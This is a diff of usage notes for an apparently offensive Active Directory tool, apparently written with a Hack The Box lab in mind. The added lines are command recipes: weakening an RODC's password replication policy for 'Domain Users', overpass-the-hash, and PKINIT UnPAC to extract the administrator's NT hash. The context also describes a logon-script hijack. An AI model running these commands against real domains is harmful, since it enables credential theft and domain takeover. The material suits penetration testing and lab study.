@@ -68,8 +68,11 @@ soft: smb write SYSVOL/NETLOGON + ldap set scriptPath (recipe)
         [--altservice CIFS/other]
   → ark smb ls --host HOST --share C$ --ticket <id>   # native Kerberos SMB
   → ark ldap bind --dc DC --domain DOM --ticket <id>   # GSSAPI; internal ClockOffset, no faketime
+  → ark ad prp clear-never-reveal --dc DC --domain D --user U --pass-file P --rodc RODC01$ --yes
+  → ark ad prp add-reveal --dc DC --domain D --user U --pass-file P --rodc RODC01$ --group "Domain Users" --yes
   → ark kerberos keylist --dc DC --domain D --user Administrator \
         --rodc-no N --aes-file ./rodc.aes                 # RODC TGT forge + KERB-KEY-LIST
+  → ark kerberos asktgt --dc DC --domain D --user U --hash NT   # overpass if no AES password
   → lateral winrm --hash
 ```
 
@@ -84,7 +87,7 @@ Full plan: `docs/plans/SPRINT_B_AD.md`. KeyList / RBCD write are **critical** ap
 5. Detect success via marker on SYSVOL/Public, HTTP beacon, or new password WinRM.
 6. Cleanup: restore original `scriptPath` and script content when done.
 
-See also: `reports/htb-garfield/PROGRESS.md`.
+See also: `docs/private/reports/htb-garfield/PROGRESS.md`.
 
 ## Sprint 2 path (job-complete)
 
@@ -137,7 +140,7 @@ ark adcs auto --dc DC --domain DOM --user u --pass-file ./p \
   --upn administrator@DOM --sid S-1-5-21-…-500 --out admin.pfx --yes
 ```
 
-Native PKINIT UnPAC (`ark kerberos pkinit`) is **not** assembled — last hop stays Certipy (Sprint E remainder).
+Native PKINIT UnPAC: `ark kerberos pkinit --pfx admin.pfx --dc DC --domain DOM --user administrator` (stores a TGT ccache and prints the NT hash). Certipy remains a fallback.
 
 ## AI
 
